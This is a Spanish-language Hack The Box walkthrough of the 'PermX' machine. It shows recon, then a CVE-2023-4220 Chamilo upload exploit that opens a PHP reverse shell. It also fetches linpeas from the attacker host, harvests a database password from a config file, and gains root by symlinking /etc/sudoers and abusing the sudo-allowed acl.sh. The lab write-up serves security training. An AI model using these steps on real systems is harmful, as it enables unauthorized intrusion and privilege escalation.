@@ -1,0 +1,315 @@
+-------------
+PermX
+-----------------
+1. Confirmamos tener conexión y comprobamos a que máquina nos estamos enfrentando:
+
+```bash
+┌──(mili㉿kali)-[~/Desktop/HTB/PermX]
+└─$ ping -c 1 10.10.11.23
+PING 10.10.11.23 (10.10.11.23) 56(84) bytes of data.
+64 bytes from 10.10.11.23: icmp_seq=1 ttl=63 time=37.8 ms
+
+--- 10.10.11.23 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 37.830/37.830/37.830/0.000 ms
+```
+
+2. Escaneo general de puertos:
+
+```bash
+┌──(mili㉿kali)-[~/Desktop/HTB/PermX]
+└─$ sudo nmap -sS --allports --min-rate 5000 -vv 10.10.11.23 -oG allports 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 23:35 CEST
+Initiating Ping Scan at 23:35
+Scanning 10.10.11.23 [4 ports]
+Completed Ping Scan at 23:35, 0.07s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 23:35
+Completed Parallel DNS resolution of 1 host. at 23:35, 0.00s elapsed
+Initiating SYN Stealth Scan at 23:35
+Scanning 10.10.11.23 (10.10.11.23) [1000 ports]
+Discovered open port 80/tcp on 10.10.11.23
+Discovered open port 22/tcp on 10.10.11.23
+Completed SYN Stealth Scan at 23:35, 0.29s elapsed (1000 total ports)
+Nmap scan report for 10.10.11.23 (10.10.11.23)
+Host is up, received echo-reply ttl 63 (0.067s latency).
+Scanned at 2024-10-01 23:35:30 CEST for 0s
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
+           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.036KB)
+
+```
+
+3. Escaneo específico de puertos para concer las versiones de los servicios:
+
+```bash
+┌──(mili㉿kali)-[~/Desktop/HTB/PermX]
+└─$ nmap -sCV -p22,80 10.10.11.23 -oN escaneo
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 23:37 CEST
+Nmap scan report for 10.10.11.23 (10.10.11.23)
+Host is up (0.039s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
+|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://permx.htb
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.43 seconds
+```
+
+3. IIS
+
+Depués de realizar fuzzing para enumerar directorios y no encontrar nada, he hecho fuzzing a los subdirectorios:
+
+```bash
+┌──(mili㉿kali)-[~/Desktop/HTB/PermX]
+└─$ ffuf -u http://permx.htb -H "HOST:FUZZ.permx.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://permx.htb
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+ :: Header           : Host: FUZZ.permx.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 18
+________________________________________________
+
+lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 1159ms]
+www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 3341ms]
+```
+
+Y encontramos lms y www, habrá que añadirlo a /etc/hosts.
+
+![image](https://github.com/user-attachments/assets/cc1a6b8f-8015-4285-aa83-163978e60a1c)
+
+Nos aparece la siguiente página con un panel de login.
+
+Investigando un poco, podemos encontrar una vulnerabilidad de chamilo:
+
+![image](https://github.com/user-attachments/assets/8e570b1f-2f0e-47ce-a5bb-046118f5ae13)
+
+
+Podemos descargar el exploit que es muy sencillo de utilizar y vemos que el resultado es instantáneo:
+
+```bash
+┌──(mili㉿kali)-[~/Desktop/HTB/PermX]
+└─$ ./CVE-2023-4220.sh 
+-e 
+All options -f, -h, and -p are required.
+-e 
+Usage: ./CVE-2023-4220.sh -f reverse_file -h host_link -p port_in_the_reverse_file
+-e 
+Options:
+  -f    Path to the reverse file
+  -h    Host link where the file will be uploaded
+  -p    Port for the reverse shell
+                                                                                                                                                                                             
+┌──(mili㉿kali)-[~/Desktop/HTB/PermX]
+└─$ ./CVE-2023-4220.sh -f revshell.php -h http://lms.permx.htb -p 4444
+-e 
+The file has successfully been uploaded.
+
+-e #    Use This leter For Interactive TTY ;)  
+#    python3 -c 'import pty;pty.spawn("/bin/bash")'
+#    export TERM=xterm
+#    CTRL + Z
+#    stty raw -echo; fg
+-e 
+# Starting Reverse Shell On Port 4444 . . . . . . .
+-e 
+listening on [any] 4444 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.11.23] 37402
+Linux permx 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 22:22:30 up 51 min,  0 users,  load average: 0.02, 0.07, 0.02
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$
+```
+
+```bash
+$ cat /etc/passwd | grep /bin/bash
+root:x:0:0:root:/root:/bin/bash
+mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
+```
+
+Para conseguir una bash más bonita:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Ahora para encontrar información podemos usar linpeas.sh:
+
+Iniciamos un servidor de python en la carpeta donde tenemos el linpeas
+```bash
+┌──(mili㉿kali)-[~/Desktop/HTB/PermX]
+└─$ python3 -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+10.10.11.23 - - [02/Oct/2024 00:46:35] "GET /linpeas.sh HTTP/1.1" 200 -
+```
+
+Y lo bajamos en la máquina víctima 
+```bash
+www-data@permx:/var/www/html$ wget http://10.10.14.15:8888/linpeas.sh
+wget http://10.10.14.15:8888/linpeas.sh
+--2024-10-01 22:46:34--  http://10.10.14.15:8888/linpeas.sh
+Connecting to 10.10.14.15:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 824942 (806K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh          100%[===================>] 805.61K  3.08MB/s    in 0.3s    
+
+2024-10-01 22:46:35 (3.08 MB/s) - ‘linpeas.sh’ saved [824942/824942]
+
+www-data@permx:/var/www/html$ ls
+ls
+404.html     contact.html                 img         linpeas.sh
+LICENSE.txt  courses.html                 index.html  scss
+READ-ME.txt  css                          js          team.html
+about.html   elearning-html-template.jpg  lib         testimonial.html
+
+```
+
+```bash
+╔══════════╣ Searching passwords in config PHP files
+/var/www/chamilo/app/config/configuration.php:                'show_password_field' => false,                                                                                                
+/var/www/chamilo/app/config/configuration.php:                'show_password_field' => true,
+/var/www/chamilo/app/config/configuration.php:        'wget_password' => '',
+/var/www/chamilo/app/config/configuration.php:    'force_different_password' => false,
+/var/www/chamilo/app/config/configuration.php:$_configuration['auth_password_links'] = [
+/var/www/chamilo/app/config/configuration.php:$_configuration['db_password'] = '03F6lY3uXAP2bkW8'
+```
+
+Después del escaneo nos aparece una posible contraseña para el usuario MTZ que hos ha aparecido antes:
+
+```bash
+┌──(mili㉿kali)-[~/Desktop/HTB/PermX]
+└─$ ssh mtz@10.10.11.23
+The authenticity of host '10.10.11.23 (10.10.11.23)' can't be established.
+ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.23' (ED25519) to the list of known hosts.
+mtz@10.10.11.23's password: 
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Tue Oct  1 10:51:53 PM UTC 2024
+
+  System load:           0.12
+  Usage of /:            59.6% of 7.19GB
+  Memory usage:          23%
+  Swap usage:            0%
+  Processes:             242
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.23
+  IPv6 address for eth0: dead:beef::250:56ff:fe94:a912
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Jul  1 13:09:13 2024 from 10.10.14.40
+mtz@permx:~$
+```
+
+Y funciona y conseguimos nuestra flag de user.
+
+4. Escalada de privilegios
+
+```bash
+mtz@permx:~$ sudo -l
+Matching Defaults entries for mtz on permx:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User mtz may run the following commands on permx:
+    (ALL : ALL) NOPASSWD: /opt/acl.sh
+mtz@permx:~$ cd /opt
+mtz@permx:/opt$ ls
+acl.sh
+mtz@permx:/opt$ cat acl.sh
+#!/bin/bash
+
+if [ "$#" -ne 3 ]; then
+    /usr/bin/echo "Usage: $0 user perm file"
+    exit 1
+fi
+
+user="$1"
+perm="$2"
+target="$3"
+
+if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
+    /usr/bin/echo "Access denied."
+    exit 1
+fi
+
+# Check if the path is a file
+if [ ! -f "$target" ]; then
+    /usr/bin/echo "Target must be a file."
+    exit 1
+fi
+
+/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
+```
+
+Se crea con ln una especie de vínculo entre los archivos y con el programa acl.sh se pueden otorgar los permisos necesarios para modificar el archivo sudoers y lograr la flag del root:
+
+```bash
+mtz@permx:~$ ln -s /etc/sudoers helpfile
+mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/helpfile
+mtz@permx:~$ vim /etc/sudoers
+```
+
+![image](https://github.com/user-attachments/assets/7db194a3-2e31-4758-a6fc-f8d8754fbd9b)
+
+
+```bash
+mtz@permx:/$ sudo su
+[sudo] password for mtz: 
+Sorry, try again.
+[sudo] password for mtz: 
+root@permx:/#
+```
+
+https://app.hackthebox.com/profile/overview
